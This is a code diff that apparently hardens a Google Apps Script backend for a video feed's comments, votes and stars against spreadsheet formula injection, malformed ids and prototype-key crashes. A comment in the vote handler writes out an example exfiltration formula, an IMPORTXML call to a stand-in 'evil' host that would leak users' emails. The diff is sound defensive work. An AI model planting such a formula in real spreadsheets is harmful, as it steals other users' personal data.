@@ -144,6 +144,19 @@ function findVideoIdCol(headers) {
 }
 
 /**
+ * True if `s` is a well-formed public id: a string of 1-64 chars drawn only
+ * from the id alphabet [A-Za-z0-9_-]. YouTube ids are 11 chars and article
+ * ids are already alphanumeric, so this rejects both junk-row flooding and
+ * formula-shaped payloads (=, +, quotes, parens) before any write handler
+ * trusts a client-supplied id.
+ * @param {*} s
+ * @returns {boolean}
+ */
+function isValidId(s) {
+  return typeof s === 'string' && /^[A-Za-z0-9_-]{1,64}$/.test(s);
+}
+
+/**
  * Decodes HTML entities in RSS/Atom feed text.
  * Handles named entities (&amp; &lt; etc.), decimal (&#8217;), and hex (&#x2019;).
  * @param {string} text
@@ -733,7 +746,18 @@ function crawlAllFeeds() {
             }
           }
 
-          videosSheet.appendRow(newRow);
+          // Write as plain text so a hostile feed can't seed a live formula.
+          // RSS title/url land verbatim here; without the '@' format a
+          // '=HYPERLINK(...)'/'=IMPORTXML(...)' title becomes a formula that
+          // executes in the owner's context and readAllVideos would serve back
+          // its evaluated value. Numeric columns (counts, view_count) are read
+          // back via Number(...) || 0, so text-formatting the whole row is safe.
+          // (A batched-append refactor lives in fix/be-crawl-perf; this keeps
+          // the single-append path formatting its own range.)
+          var appendRowNum = videosSheet.getLastRow() + 1;
+          var appendRange = videosSheet.getRange(appendRowNum, 1, 1, newRow.length);
+          appendRange.setNumberFormat('@');
+          appendRange.setValues([newRow]);
           existingVideos[video.video_id] = true;
           if (normUrl !== '') existingUrls[normUrl] = true;
           newCount++;
@@ -2684,7 +2708,12 @@ function handleCommentsBatch(params) {
     return { status: 'error', message: 'videoIds is required' };
   }
 
-  var byVideo = {};
+  // Null-prototype map: a comment row whose video_id is 'constructor',
+  // 'toString', or 'valueOf' would otherwise be truthy on a plain {} (it
+  // resolves to an inherited Object.prototype member), pass the `if
+  // (!byVideo[vid])` gate below, and throw on `.push` — crashing comment-count
+  // hydration for the whole feed until the row is deleted.
+  var byVideo = Object.create(null);
   ids.forEach(function(id) { byVideo[id] = []; });
 
   var sheet = getSheet('COMMENTS');
@@ -2712,6 +2741,33 @@ function handleCommentsBatch(params) {
   return { status: 'ok', byVideo: byVideo };
 }
 
+/**
+ * True if a comment with `commentId` exists on `videoId`. Used to validate a
+ * reply's parent before threading it: a parentId that doesn't resolve to a
+ * comment on the same video is treated as top-level so buildCommentTree can't
+ * promote an orphan reply onto the target video. String-compares to survive
+ * Sheets type coercion, matching the vote/star scans.
+ * @param {string} commentId
+ * @param {string} videoId
+ * @returns {boolean}
+ */
+function commentExistsOnVideo(commentId, videoId) {
+  var sheet = getSheet('COMMENTS');
+  var data = sheet.getDataRange().getValues();
+  if (data.length <= 1) return false;
+  var headers = data[0];
+  var idCol = headers.indexOf('comment_id');
+  var videoIdCol = findVideoIdCol(headers);
+  if (idCol === -1 || videoIdCol === -1) return false;
+  for (var i = 1; i < data.length; i++) {
+    if (String(data[i][idCol]) === String(commentId) &&
+        String(data[i][videoIdCol]) === String(videoId)) {
+      return true;
+    }
+  }
+  return false;
+}
+
 function handleAddComment(data) {
   var videoId = data.videoId;
   var parentId = data.parentId;
@@ -2721,6 +2777,12 @@ function handleAddComment(data) {
   // 1. Validate required fields
   if (!videoId || !body || !token) {
     return { status: 'error', message: 'videoId, body, and token are required' };
+  }
+
+  // 1b. Validate videoId shape before trusting it in a write (blocks junk-row
+  // flooding and formula-shaped ids from reaching the sheet).
+  if (!isValidId(videoId)) {
+    return { status: 'error', message: 'Invalid videoId' };
   }
 
   // 2. Validate comment length (max 2000 characters)
@@ -2741,10 +2803,17 @@ function handleAddComment(data) {
     return { status: 'error', message: 'You have been blocked from commenting' };
   }
 
-  // 5. Determine depth
+  // 5. Determine depth. A reply's parent must already exist ON THIS VIDEO;
+  // otherwise buildCommentTree would promote an orphan/foreign parentId onto the
+  // target video. An unresolvable parentId is demoted to a top-level comment
+  // (parent_id cleared below via `parentId || ''`, depth stays 0).
   var depth = 0;
   if (parentId) {
-    depth = 1;
+    if (commentExistsOnVideo(parentId, videoId)) {
+      depth = 1;
+    } else {
+      parentId = '';
+    }
   }
 
   // 6. Generate comment ID
@@ -2907,6 +2976,10 @@ function handleVote(data) {
     return { status: 'error', message: 'videoId and token are required' };
   }
 
+  if (!isValidId(videoId)) {
+    return { status: 'error', message: 'Invalid videoId' };
+  }
+
   var user = authenticateUser(token);
   if (!user) {
     log('ERROR', 'vote', 'Invalid Google token');
@@ -2947,8 +3020,16 @@ function handleVote(data) {
       sheet.deleteRow(existingRow);
       voted = false;
     } else {
+      // Write as plain text so Sheets can't coerce videoId/email into a live
+      // formula. The Votes tab's column C is user_email, so a videoId of
+      // '=IMPORTXML("https://evil/?d="&C2,"//a")' would otherwise execute in the
+      // owner's session on open and exfiltrate adjacent users' emails. Mirrors
+      // the reserve-then-format pair used by handleStar/handleAddComment.
       var voteId = 'v_' + Utilities.getUuid().replace(/-/g, '').substring(0, 12);
-      sheet.appendRow([voteId, videoId, user.email, new Date().toISOString()]);
+      var newRowNum = sheet.getLastRow() + 1;
+      var range = sheet.getRange(newRowNum, 1, 1, 4);
+      range.setNumberFormat('@');
+      range.setValues([[voteId, videoId, user.email, new Date().toISOString()]]);
       voted = true;
     }
 
@@ -3068,6 +3149,14 @@ function handleStar(data) {
 
   if (!channel || !token) {
     return { status: 'error', message: 'channel and token are required' };
+  }
+
+  // channel is a display name (spaces, '&', ...), not an id, so cap its length
+  // rather than restrict the charset — enough to stop junk-row flooding with a
+  // giant channel string. The '@'-formatted write below defeats formula
+  // injection on the value itself.
+  if (typeof channel !== 'string' || channel.length > 200) {
+    return { status: 'error', message: 'Invalid channel' };
   }
 
   var user = authenticateUser(token);
